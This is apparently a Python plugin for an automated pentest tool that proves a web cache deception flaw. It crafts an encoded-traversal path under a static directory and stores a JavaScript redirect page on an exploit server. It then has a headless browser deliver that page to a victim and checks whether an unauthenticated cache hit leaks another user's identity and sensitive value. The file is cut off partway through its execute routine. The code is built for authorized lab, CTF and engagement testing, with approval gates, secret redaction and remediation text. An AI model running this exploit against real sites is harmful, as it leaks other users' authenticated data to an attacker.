"""Fail-closed Web Cache Deception proof.

The initial native mode proves one bounded origin-normalization discrepancy.
The cache sees a raw static-directory path while the origin decodes an encoded
separator and resolves the request into an authenticated sensitive endpoint.

The backend injects authentication from the workflow AuthContext.  The model
cannot provide cookies, headers, traversal bytes, nonces, exploit HTML, browser
script, or solution bodies.
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import re
import secrets
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit

import aiohttp
from yarl import URL

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    MAX_EVIDENCE_CHARS,
    MAX_RESPONSE_BYTES,
    REDACTED_RUNTIME_SECRET,
    _field_name,
    _http_target,
    _path_and_query,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"origin-normalization-static-dir-v1"}
ALLOWED_PROOF_LEVELS = {"runtime-foreign-response", "lab-state-change"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
MAX_MARKER_CHARS = 512
MAX_PATH_CHARS = 2_048
MAX_COOKIE_CHARS = 8_192
MAX_POLL_ATTEMPTS = 8
RESPONSE_HEAD = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
USER_AGENT = "xASM-Agentic-Cache-Deception-Probe/1.0"
ACCEPT = "text/html,application/xhtml+xml,application/json"
_SAFE_PATH = re.compile(r"/[A-Za-z0-9._~!$&'()*+,;=:@/%?-]*")
_SAFE_PREFIX = re.compile(r"[^\r\n\0]{3,512}")
_ALLOWED_PARAMETERS = {
    "target",
    "url",
    "exploitServer",
    "mode",
    "proofLevel",
    "sensitivePath",
    "staticDirectoryPath",
    "identityPrefix",
    "sensitiveValuePrefix",
    "cacheStatusHeader",
    "cacheMissMarker",
    "cacheHitMarker",
    "expectedSensitiveStatus",
    "expectedCacheStatus",
    "minimumCacheTtlSeconds",
    "maximumCacheTtlSeconds",
    "exploitStorePath",
    "exploitResourcePath",
    "exploitHttpsField",
    "exploitFileField",
    "exploitHeadField",
    "exploitBodyField",
    "exploitActionField",
    "exploitHttpsValue",
    "exploitStoreValue",
    "exploitDeliverValue",
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "solutionPath",
    "solutionField",
    "expectedStatusStatus",
    "expectedSolutionStatus",
    "expectedSolvedStatus",
    "engagement",
    "allowUnsafeMethods",
    "cachePopulationApproved",
    "victimBrowserDeliveryApproved",
    "stateChangeApproved",
    "solutionSubmitApproved",
    "pollAttempts",
    "pollIntervalMs",
    "timeoutSeconds",
    "authCookies",
    "cookie",
    "authHeaders",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}
_LAB_PARAMETERS = {
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "solutionPath",
    "solutionField",
    "expectedStatusStatus",
    "expectedSolutionStatus",
    "expectedSolvedStatus",
    "stateChangeApproved",
    "solutionSubmitApproved",
}


class CacheDeceptionProbeError(ValueError):
    """Raised when the closed proof cannot be established."""


def _sha256(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _origin(value: str) -> Tuple[str, str, int]:
    parsed = urlsplit(value)
    return (
        parsed.scheme.lower(),
        (parsed.hostname or "").lower(),
        parsed.port or (443 if parsed.scheme.lower() == "https" else 80),
    )


def _origin_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    target = _http_target(raw)
    if not target:
        return None
    parsed = urlsplit(target)
    if parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
        return None
    return target


def _relative_path(value: Any, *, allow_percent: bool = False) -> Optional[str]:
    raw = str(value or "").strip()
    if (
        not raw
        or len(raw) > MAX_PATH_CHARS
        or not raw.startswith("/")
        or raw.startswith("//")
        or "\\" in raw
        or "\r" in raw
        or "\n" in raw
        or "\0" in raw
        or "#" in raw
        or (not allow_percent and "%" in raw)
        or not _SAFE_PATH.fullmatch(raw)
    ):
        return None
    parsed = urlsplit(raw)
    if parsed.scheme or parsed.netloc or parsed.fragment:
        return None
    return raw


def _bounded_marker(value: Any) -> Optional[str]:
    raw = str(value or "")
    return raw if _SAFE_PREFIX.fullmatch(raw) and raw == raw.strip() else None


def _bounded_status(parameters: Dict[str, Any], name: str) -> Optional[int]:
    try:
        value = int(parameters[name])
    except (KeyError, TypeError, ValueError):
        return None
    return value if 200 <= value <= 399 else None


def _validated_cookie(parameters: Dict[str, Any]) -> Tuple[Optional[str], str]:
    auth_cookies = parameters.get("authCookies")
    cookie_alias = parameters.get("cookie")
    values = [
        str(value)
        for value in (auth_cookies, cookie_alias)
        if isinstance(value, str) and value
    ]
    if not values:
        return None, "an active server-injected authCookies/cookie session is required"
    if len(set(values)) != 1:
        return None, "server-injected authCookies and cookie aliases must match exactly"
    cookie = values[0]
    if (
        len(cookie) > MAX_COOKIE_CHARS
        or "\r" in cookie
        or "\n" in cookie
        or "\0" in cookie
        or not any("=" in part for part in cookie.split(";"))
    ):
        return None, "server-injected cookie is malformed"
    return cookie, ""


def _validated_authorization(parameters: Dict[str, Any]) -> Tuple[Optional[str], str]:
    raw = parameters.get("authHeaders")
    if raw is None:
        return "", ""
    if not isinstance(raw, dict) or set(raw) != {"Authorization"}:
        return None, "server-injected authHeaders may contain only Authorization"
    value = str(raw.get("Authorization") or "")
    if (
        len(value) < 3
        or len(value) > MAX_COOKIE_CHARS
        or "\r" in value
        or "\n" in value
        or "\0" in value
    ):
        return None, "server-injected Authorization is malformed"
    return value, ""


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    unexpected = set(parameters) - _ALLOWED_PARAMETERS
    if unexpected:
        return False, f"unsupported parameter(s): {', '.join(sorted(unexpected))}"

    target = _origin_target(parameters.get("target") or parameters.get("url"))
    exploit = _origin_target(parameters.get("exploitServer"))
    if not target:
        return False, "target must be a credential-free HTTP(S) origin"
    if not exploit:
        return False, "exploitServer must be a credential-free HTTP(S) origin"
    if _origin(target) == _origin(exploit):
        return False, "exploitServer must be cross-origin from target"

    mode = str(parameters.get("mode") or "").lower()
    proof_level = str(parameters.get("proofLevel") or "").lower()
    engagement = str(parameters.get("engagement") or "").lower()
    if mode not in ALLOWED_MODES:
        return False, "mode must be origin-normalization-static-dir-v1"
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-foreign-response or lab-state-change"
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"

    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"
    if parameters.get("cachePopulationApproved") is not True:
        return False, "cachePopulationApproved=true is required"
    if parameters.get("victimBrowserDeliveryApproved") is not True:
        return False, "victimBrowserDeliveryApproved=true is required"
    if proof_level == "lab-state-change":
        if engagement not in {"lab", "ctf"}:
            return False, "lab-state-change is restricted to lab or ctf"
        if parameters.get("stateChangeApproved") is not True:
            return False, "stateChangeApproved=true is required"
        if parameters.get("solutionSubmitApproved") is not True:
            return False, "solutionSubmitApproved=true is required"
    elif set(parameters).intersection(_LAB_PARAMETERS):
        return False, "lab-only parameters are forbidden for runtime-foreign-response"

    for key in ("sensitivePath", "exploitStorePath", "exploitResourcePath"):
        if not _relative_path(parameters.get(key)):
            return False, f"{key} must be a bounded relative path without encoding"
    static_dir = _relative_path(parameters.get("staticDirectoryPath"))
    if not static_dir or not static_dir.endswith("/") or static_dir == "/":
        return False, "staticDirectoryPath must be a bounded non-root directory ending in /"
    if str(parameters["sensitivePath"]) == static_dir.rstrip("/"):
        return False, "sensitivePath and staticDirectoryPath must be distinct"

    prefixes = [
        _bounded_marker(parameters.get("identityPrefix")),
        _bounded_marker(parameters.get("sensitiveValuePrefix")),
    ]
    if any(value is None for value in prefixes) or prefixes[0] == prefixes[1]:
        return False, "identity and sensitive-value prefixes must be distinct bounded text"

    header = str(parameters.get("cacheStatusHeader") or "")
    if not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]{1,80}", header):
        return False, "cacheStatusHeader must be a valid header name"
    if header.lower() not in {"x-cache", "cf-cache-status"}:
        return False, "cacheStatusHeader must be X-Cache or CF-Cache-Status for native proof"
    cache_markers = [
        str(parameters.get("cacheMissMarker") or ""),
        str(parameters.get("cacheHitMarker") or ""),
    ]
    if (
        any(not marker or len(marker) > 80 or re.search(r"[\r\n\0]", marker) for marker in cache_markers)
        or cache_markers[0].lower() == cache_markers[1].lower()
    ):
        return False, "cache miss/hit markers must be distinct bounded text"

    for key in (
        "exploitHttpsField",
        "exploitFileField",
        "exploitHeadField",
        "exploitBodyField",
        "exploitActionField",
    ):
        if not _field_name(parameters.get(key)):
            return False, f"{key} must be a valid form-field name"
    action_values = [
        str(parameters.get(key) or "")
        for key in ("exploitHttpsValue", "exploitStoreValue", "exploitDeliverValue")
    ]
    if (
        any(not value or len(value) > 80 or re.search(r"[\r\n\0]", value) for value in action_values)
        or action_values[1] == action_values[2]
    ):
        return False, "exploit action values must be bounded and store/deliver must differ"

    if any(
        _bounded_status(parameters, key) is None
        for key in ("expectedSensitiveStatus", "expectedCacheStatus")
    ):
        return False, "expected sensitive/cache statuses must be between 200 and 399"
    try:
        minimum_ttl = int(parameters.get("minimumCacheTtlSeconds"))
        maximum_ttl = int(parameters.get("maximumCacheTtlSeconds"))
        poll_attempts = int(parameters.get("pollAttempts") or 6)
        poll_interval = int(parameters.get("pollIntervalMs") or 1_000)
        timeout = int(parameters.get("timeoutSeconds") or 20)
    except (TypeError, ValueError):
        return False, "TTL, poll, and timeout values must be integers"
    if minimum_ttl < 1 or maximum_ttl > 120 or minimum_ttl > maximum_ttl:
        return False, "cache TTL bounds must be positive, ordered, and at most 120 seconds"
    if poll_attempts < 1 or poll_attempts > MAX_POLL_ATTEMPTS:
        return False, f"pollAttempts must be between 1 and {MAX_POLL_ATTEMPTS}"
    if poll_interval < 250 or poll_interval > 2_000:
        return False, "pollIntervalMs must be between 250 and 2000"
    if timeout < 5 or timeout > 45:
        return False, "timeoutSeconds must be between 5 and 45"

    if proof_level == "lab-state-change":
        for key in ("statusPath", "solutionPath"):
            if not _relative_path(parameters.get(key)):
                return False, f"{key} must be a bounded relative path"
        if not _field_name(parameters.get("solutionField")):
            return False, "solutionField must be a valid form-field name"
        markers = [
            _bounded_marker(parameters.get("unsolvedMarker")),
            _bounded_marker(parameters.get("solvedMarker")),
        ]
        if (
            any(value is None for value in markers)
            or markers[0] == markers[1]
            or str(markers[0]) in str(markers[1])
            or str(markers[1]) in str(markers[0])
        ):
            return False, "unsolved/solved markers must be distinct and unambiguous"
        if any(
            _bounded_status(parameters, key) is None
            for key in (
                "expectedStatusStatus",
                "expectedSolutionStatus",
                "expectedSolvedStatus",
            )
        ):
            return False, "lab expected statuses must be between 200 and 399"

    cookie, cookie_reason = _validated_cookie(parameters)
    authorization, authorization_reason = _validated_authorization(parameters)
    if cookie is None:
        return False, cookie_reason
    if authorization is None:
        return False, authorization_reason
    return True, ""


def build_crafted_path(static_directory_path: str, sensitive_path: str, nonce: str) -> str:
    """Return a raw static-dir key which normalizes to the sensitive endpoint."""
    leaf = sensitive_path.lstrip("/")
    return f"{static_directory_path}..%2f{leaf}?xasm_wcd={nonce}"


def build_redirect_poc(destination: str) -> str:
    escaped = html.escape(destination, quote=True)
    return (
        "<!doctype html>\n"
        "<html><head><meta charset=\"utf-8\"></head><body>\n"
        f"<script>window.location.assign(\"{escaped}\");</script>\n"
        "</body></html>"
    )


def build_delivery_control_selector(action_field: str, deliver_value: str) -> str:
    field = action_field.replace("\\", "\\\\").replace('"', '\\"')
    value = deliver_value.replace("\\", "\\\\").replace('"', '\\"')
    return (
        f'button[name="{field}"][value="{value}"], '
        f'input[type="submit"][name="{field}"][value="{value}"]'
    )


def canonicalize_form_newlines(value: str) -> str:
    return re.sub(r"\r\n|\r|\n", "\r\n", value)


def _html_text(document: str) -> str:
    without_script = re.sub(r"<(?:script|style)\b.*?</(?:script|style)\s*>", "", document, flags=re.I | re.S)
    with_lines = re.sub(r"</?(?:div|p|li|br|tr|td|h[1-6])\b[^>]*>", "\n", without_script, flags=re.I)
    return html.unescape(re.sub(r"<[^>]+>", "", with_lines))


def extract_prefixed_value(document: str, prefix: str) -> Optional[str]:
    text = _html_text(document)
    matches: List[str] = []
    for line in text.splitlines():
        position = line.find(prefix)
        if position < 0:
            continue
        value = line[position + len(prefix) :].strip()
        if value and len(value) <= 512 and not re.search(r"[\r\n\0]", value):
            matches.append(value)
    unique = sorted(set(matches))
    return unique[0] if len(unique) == 1 else None


def _header_values(headers: Any, name: str) -> List[str]:
    if hasattr(headers, "getall"):
        return [str(value) for value in headers.getall(name, [])]
    if isinstance(headers, dict):
        for key, value in headers.items():
            if str(key).lower() != name.lower():
                continue
            return [str(item) for item in value] if isinstance(value, list) else [str(value)]
    return []


def cache_ttl_seconds(headers: Any) -> Optional[int]:
    values = _header_values(headers, "Cache-Control")
    matches: List[int] = []
    for value in values:
        for match in re.finditer(r"(?:^|,)\s*(?:s-maxage|max-age)\s*=\s*\"?(\d+)\"?", value, re.I):
            matches.append(int(match.group(1)))
    return min(matches) if matches else None


def _request_transcript(
    method: str,
    url: str,
    body: str,
    cookie: str,
    authorization: str,
    secret_values: Iterable[Any],
) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        f"User-Agent: {USER_AGENT}",
        f"Accept: {ACCEPT}",
    ]
    if body:
        lines.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body.encode('utf-8'))}",
            ]
        )
    if cookie:
        lines.append(f"Cookie: {cookie}")
    if authorization:
        lines.append(f"Authorization: {authorization}")
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body,
        secret_values,
        MAX_EVIDENCE_CHARS,
    )


def _response_transcript(response: Dict[str, Any], secret_values: Iterable[Any]) -> str:
    lines = [f"HTTP/1.1 {response['status']} {response['reason']}"]
    names = (
        "Content-Type",
        "Location",
        "Cache-Control",
        "Age",
        "X-Cache",
        "CF-Cache-Status",
        "Set-Cookie",
    )
    for name in names:
        for value in _header_values(response.get("headers"), name):
            lines.append(f"{name}: {value}")
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    return sanitize_evidence_text(raw, secret_values, MAX_EVIDENCE_CHARS)


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    cookie: str,
    authorization: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Dict[str, Any]:
    request = _request_transcript(method, url, body, cookie, authorization, secret_values)
    response_text = _response_transcript(response, secret_values)
    return {
        "label": label,
        "request": request,
        "requestSha256": _sha256(request),
        "response": response_text,
        "responseSha256": _sha256(response_text),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(str(response.get("body") or "").encode("utf-8")),
        "responseExcerptTruncated": bool(response.get("truncated")),
    }


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "template-id": "xasm-web-cache-deception-origin-normalization-verified",
        "matcher-name": "cache-hit-foreign-authenticated-response",
        "type": "http",
        "host": target,
        "matched-at": str(verification.get("victimUrl") or target),
        "info": {
            "name": "Verified Web Cache Deception via Origin Path Normalization",
            "severity": "high",
            "description": (
                "A shared cache stored an authenticated victim response under a raw "
                "static-directory path that the origin normalized to a sensitive endpoint. "
                "An unauthenticated cache hit returned a distinct foreign identity and "
                "sensitive value."
            ),
            "remediation": (
                "Do not cache authenticated or user-specific responses. Normalize paths "
                "identically at every proxy and origin before applying cache rules, reject "
                "ambiguous encoded traversal, and key cacheability on the origin response "
                "rather than a raw path extension or directory."
            ),
            "classification": {"cwe-id": ["CWE-524"]},
        },
        "evidence": verification,
    }


class CacheDeceptionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:cache_deception_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms one origin-normalization Web Cache Deception variant with "
            "server-injected auth, a never-warmed victim key, real browser delivery, "
            "an unauthenticated cache hit containing distinct foreign data, and complete "
            "sanitized Request/Response evidence."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "exploitServer": {"type": "string"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                "sensitivePath": {"type": "string"},
                "staticDirectoryPath": {"type": "string"},
                "identityPrefix": {"type": "string", "minLength": 3, "maxLength": 512},
                "sensitiveValuePrefix": {"type": "string", "minLength": 3, "maxLength": 512},
                "cacheStatusHeader": {"type": "string"},
                "cacheMissMarker": {"type": "string"},
                "cacheHitMarker": {"type": "string"},
                "expectedSensitiveStatus": {"type": "integer", "minimum": 200, "maximum": 399},
                "expectedCacheStatus": {"type": "integer", "minimum": 200, "maximum": 399},
                "minimumCacheTtlSeconds": {"type": "integer", "minimum": 1, "maximum": 120},
                "maximumCacheTtlSeconds": {"type": "integer", "minimum": 1, "maximum": 120},
                "exploitStorePath": {"type": "string"},
                "exploitResourcePath": {"type": "string"},
                "exploitHttpsField": {"type": "string"},
                "exploitFileField": {"type": "string"},
                "exploitHeadField": {"type": "string"},
                "exploitBodyField": {"type": "string"},
                "exploitActionField": {"type": "string"},
                "exploitHttpsValue": {"type": "string"},
                "exploitStoreValue": {"type": "string"},
                "exploitDeliverValue": {"type": "string"},
                "statusPath": {"type": "string"},
                "unsolvedMarker": {"type": "string"},
                "solvedMarker": {"type": "string"},
                "solutionPath": {"type": "string"},
                "solutionField": {"type": "string"},
                "expectedStatusStatus": {"type": "integer", "minimum": 200, "maximum": 399},
                "expectedSolutionStatus": {"type": "integer", "minimum": 200, "maximum": 399},
                "expectedSolvedStatus": {"type": "integer", "minimum": 200, "maximum": 399},
                "engagement": {"type": "string", "enum": sorted(ALLOWED_ENGAGEMENTS)},
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "cachePopulationApproved": {"type": "boolean", "default": False},
                "victimBrowserDeliveryApproved": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "solutionSubmitApproved": {"type": "boolean", "default": False},
                "pollAttempts": {"type": "integer", "minimum": 1, "maximum": MAX_POLL_ATTEMPTS},
                "pollIntervalMs": {"type": "integer", "minimum": 250, "maximum": 2_000},
                "timeoutSeconds": {"type": "integer", "minimum": 5, "maximum": 45},
                "authCookies": {"type": "string", "x-hidden": True, "x-workflow-owned": True},
                "cookie": {"type": "string", "x-hidden": True, "x-workflow-owned": True},
                "authHeaders": {
                    "type": "object",
                    "additionalProperties": False,
                    "properties": {"Authorization": {"type": "string"}},
                    "required": ["Authorization"],
                    "x-hidden": True,
                    "x-workflow-owned": True,
                },
            },
            "required": [
                "exploitServer",
                "mode",
                "proofLevel",
                "sensitivePath",
                "staticDirectoryPath",
                "identityPrefix",
                "sensitiveValuePrefix",
                "cacheStatusHeader",
                "cacheMissMarker",
                "cacheHitMarker",
                "expectedSensitiveStatus",
                "expectedCacheStatus",
                "minimumCacheTtlSeconds",
                "maximumCacheTtlSeconds",
                "exploitStorePath",
                "exploitResourcePath",
                "exploitHttpsField",
                "exploitFileField",
                "exploitHeadField",
                "exploitBodyField",
                "exploitActionField",
                "exploitHttpsValue",
                "exploitStoreValue",
                "exploitDeliverValue",
                "engagement",
                "allowUnsafeMethods",
                "cachePopulationApproved",
                "victimBrowserDeliveryApproved",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {"properties": {"proofLevel": {"const": "lab-state-change"}}},
                    "then": {"required": sorted(_LAB_PARAMETERS)},
                    "else": {
                        "not": {
                            "anyOf": [{"required": [field]} for field in sorted(_LAB_PARAMETERS)]
                        }
                    },
                }
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "authenticated-session", "cache", "exploit-host"],
            "output_type": ["findings", "cache_deception_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm foreign authenticated data disclosure through a shared cache",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        cookie: str = "",
        authorization: str = "",
        body: str = "",
        *,
        encoded_url: bool = False,
    ) -> Dict[str, Any]:
        headers = {"User-Agent": USER_AGENT, "Accept": ACCEPT}
        if cookie:
            headers["Cookie"] = cookie
        if authorization:
            headers["Authorization"] = authorization
        if body:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        request_url: Any = URL(url, encoded=True) if encoded_url else url
        async with session.request(
            method,
            request_url,
            headers=headers,
            data=body if body else None,
            allow_redirects=False,
            ssl=True,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
                "wireUrl": str(response.request_info.url),
            }

    async def _browser_deliver(
        self,
        exploit_url: str,
        action_field: str,
        deliver_value: str,
        timeout: int,
    ) -> Dict[str, Any]:
        try:
            from playwright.async_api import async_playwright
        except Exception as exc:
            raise CacheDeceptionProbeError(f"Playwright is unavailable: {exc}") from exc

        async with async_playwright() as playwright:
            browser = await playwright.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage"],
            )
            try:
                context = await browser.new_context(ignore_https_errors=False)
                page = await context.new_page()
                load_response = await page.goto(
                    exploit_url,
                    wait_until="domcontentloaded",
                    timeout=timeout * 1_000,
                )
                if load_response is None or load_response.url != exploit_url:
                    raise CacheDeceptionProbeError("browser exploit load left the configured URL")
                load_raw = await load_response.body()
                if len(load_raw) > MAX_RESPONSE_BYTES:
                    raise CacheDeceptionProbeError("browser exploit load exceeded evidence limit")

                selector = build_delivery_control_selector(action_field, deliver_value)
                control = page.locator(selector)
                if await control.count() != 1 or not await control.is_visible() or not await control.is_enabled():
                    raise CacheDeceptionProbeError("browser delivery control was not uniquely actionable")
                async with page.expect_response(
                    lambda response: response.request.method == "POST" and response.url == exploit_url,
                    timeout=timeout * 1_000,
                ) as response_info:
                    async with page.expect_navigation(
                        wait_until="domcontentloaded",
                        timeout=timeout * 1_000,
                    ) as navigation_info:
                        await control.click(timeout=timeout * 1_000)
                delivery_response = await response_info.value
                outcome_response = await navigation_info.value
                if outcome_response is None:
                    raise CacheDeceptionProbeError("browser delivery did not complete navigation")
                delivery_raw = (
                    b""
                    if delivery_response.status in {301, 302, 303, 307, 308}
                    else await delivery_response.body()
                )
                outcome_raw = await outcome_response.body()
                if len(delivery_raw) > MAX_RESPONSE_BYTES or len(outcome_raw) > MAX_RESPONSE_BYTES:
                    raise CacheDeceptionProbeError("browser delivery response exceeded evidence limit")

                def result(response: Any, raw: bytes) -> Dict[str, Any]:
                    return {
                        "status": response.status,
                        "reason": str(response.status_text or "")[:100],
                        "headers": {},
                        "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                        "truncated": False,
                    }

                load_headers = await load_response.all_headers()
                delivery_headers = await delivery_response.all_headers()
                outcome_headers = await outcome_response.all_headers()
                load_result = result(load_response, load_raw)
                load_result["headers"] = load_headers
                delivery_result = result(delivery_response, delivery_raw)
                delivery_result["headers"] = delivery_headers
                outcome_result = result(outcome_response, outcome_raw)
                outcome_result["headers"] = outcome_headers
                return {
                    "browserUsed": True,
                    "loadUrl": load_response.url,
                    "loadResponse": load_result,
                    "deliveryUrl": delivery_response.request.url,
                    "deliveryBody": delivery_response.request.post_data or "",
                    "deliveryResponse": delivery_result,
                    "outcomeUrl": outcome_response.url,
                    "outcomeResponse": outcome_result,
                }
            finally:
                await browser.close()

    @staticmethod
    def _append_evidence(
        steps: List[Dict[str, Any]],
        label: str,
        method: str,
        url: str,
        body: str,
        cookie: str,
        authorization: str,
        response: Dict[str, Any],
        secrets_to_redact: Iterable[Any],
    ) -> None:
        step = build_http_evidence_step(
            label,
            method,
            url,
            body,
            cookie,
            authorization,
            response,
            secrets_to_redact,
        )
        if step["responseExcerptTruncated"]:
            raise CacheDeceptionProbeError(f"{label} evidence was truncated")
        steps.append(step)

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _origin_target(parameters.get("target") or parameters.get("url"))
        exploit = _origin_target(parameters.get("exploitServer"))
        cookie, _ = _validated_cookie(parameters)
        authorization, _ = _validated_authorization(parameters)
        assert target and exploit and cookie is not None and authorization is not None

        proof_level = str(parameters["proofLevel"]).lower()
        sensitive_path = str(parameters["sensitivePath"])
        static_directory_path = str(parameters["staticDirectoryPath"])
        cache_header = str(parameters["cacheStatusHeader"])
        miss_marker = str(parameters["cacheMissMarker"])
        hit_marker = str(parameters["cacheHitMarker"])
        identity_prefix = str(parameters["identityPrefix"])
        value_prefix = str(parameters["sensitiveValuePrefix"])
        expected_sensitive_status = int(parameters["expectedSensitiveStatus"])
        expected_cache_status = int(parameters["expectedCacheStatus"])
        min_ttl = int(parameters["minimumCacheTtlSeconds"])
        max_ttl = int(parameters["maximumCacheTtlSeconds"])
        timeout = int(parameters.get("timeoutSeconds") or 20)
        poll_attempts = int(parameters.get("pollAttempts") or 6)
        poll_interval_ms = int(parameters.get("pollIntervalMs") or 1_000)

        preflight_nonce = secrets.token_hex(12)
        victim_nonce = secrets.token_hex(12)
        while victim_nonce == preflight_nonce:
            victim_nonce = secrets.token_hex(12)
        preflight_path = build_crafted_path(static_directory_path, sensitive_path, preflight_nonce)
        victim_path = build_crafted_path(static_directory_path, sensitive_path, victim_nonce)
        sensitive_url = urljoin(target, sensitive_path)
        preflight_url = urljoin(target, preflight_path)
        victim_url = urljoin(target, victim_path)
        exploit_store_url = urljoin(exploit, str(parameters["exploitStorePath"]))
        poc_body = build_redirect_poc(victim_url)
        store_form = {
            str(parameters["exploitHttpsField"]): str(parameters["exploitHttpsValue"]),
            str(parameters["exploitFileField"]): str(parameters["exploitResourcePath"]),
            str(parameters["exploitHeadField"]): RESPONSE_HEAD,
            str(parameters["exploitBodyField"]): poc_body,
            str(parameters["exploitActionField"]): str(parameters["exploitStoreValue"]),
        }
        store_body = urlencode(store_form)
        request_count = 0
        steps: List[Dict[str, Any]] = []
        own_identity: Optional[str] = None
        own_value: Optional[str] = None
        foreign_identity: Optional[str] = None
        foreign_value: Optional[str] = None
        observed_ttl: Optional[int] = None
        victim_fetch_attempts = 0
        browser_result: Optional[Dict[str, Any]] = None
        baseline_status: Optional[int] = None
        solution_status: Optional[int] = None
        solved_status: Optional[int] = None
        solved_before: Optional[bool] = None
        solved_after: Optional[bool] = None
        secrets_to_redact: List[Any] = [cookie, authorization]

        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        try:
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                if proof_level == "lab-state-change":
                    status_url = urljoin(target, str(parameters["statusPath"]))
                    baseline = await self._request(session, "GET", status_url)
                    request_count += 1
                    baseline_status = int(baseline["status"])
                    unsolved = str(parameters["unsolvedMarker"])
                    solved = str(parameters["solvedMarker"])
                    if (
                        baseline["truncated"]
                        or baseline_status != int(parameters["expectedStatusStatus"])
                        or unsolved not in baseline["body"]
                        or solved in baseline["body"]
                    ):
                        raise CacheDeceptionProbeError("fresh lab baseline was not unsolved")
                    solved_before = False
                    self._append_evidence(
                        steps,
                        "unsolved-baseline",
                        "GET",
                        status_url,
                        "",
                        "",
                        "",
                        baseline,
                        secrets_to_redact,
                    )

                own = await self._request(
                    session,
                    "GET",
                    sensitive_url,
                    cookie,
                    authorization,
                )
                request_count += 1
                own_identity = extract_prefixed_value(own["body"], identity_prefix)
                own_value = extract_prefixed_value(own["body"], value_prefix)
                if (
                    own["truncated"]
                    or int(own["status"]) != expected_sensitive_status
                    or not own_identity
                    or not own_value
                    or own_identity == own_value
                ):
                    raise CacheDeceptionProbeError("authenticated sensitive control was ambiguous")
                secrets_to_redact.extend([own_identity, own_value])
                self._append_evidence(
                    steps,
                    "authenticated-sensitive-control",
                    "GET",
                    sensitive_url,
                    "",
                    cookie,
                    authorization,
                    own,
                    secrets_to_redact,
                )

                first = await self._request(
                    session,
                    "GET",
                    preflight_url,
                    cookie,
                    authorization,
                    encoded_url=True,
                )
                request_count += 1
                first_identity = extract_prefixed_value(first["body"], identity_prefix)
                first_value = extract_prefixed_value(first["body"], value_prefix)
                first_cache = _header_values(first["headers"], cache_header)
                observed_ttl = cache_ttl_seconds(first["headers"])
                if (
                    first["truncated"]
                    or int(first["status"]) != expected_cache_status
                    or not first_cache
                    or not any(miss_marker.lower() in item.lower() for item in first_cache)
                    or first_identity != own_identity
                    or first_value != own_value
                    or observed_ttl is None
                    or observed_ttl < min_ttl
                    or observed_ttl > max_ttl
                    or _path_and_query(str(first["wireUrl"])) != preflight_path
                ):
                    raise CacheDeceptionProbeError("authenticated preflight did not prove a bounded cache miss")
                self._append_evidence(
                    steps,
                    "authenticated-preflight-cache-miss",
                    "GET",
                    preflight_url,
                    "",
                    cookie,
                    authorization,
                    first,
                    secrets_to_redact,
                )

                second = await self._request(
                    session,
                    "GET",
                    preflight_url,
                    cookie,
                    authorization,
                    encoded_url=True,
                )
                request_count += 1
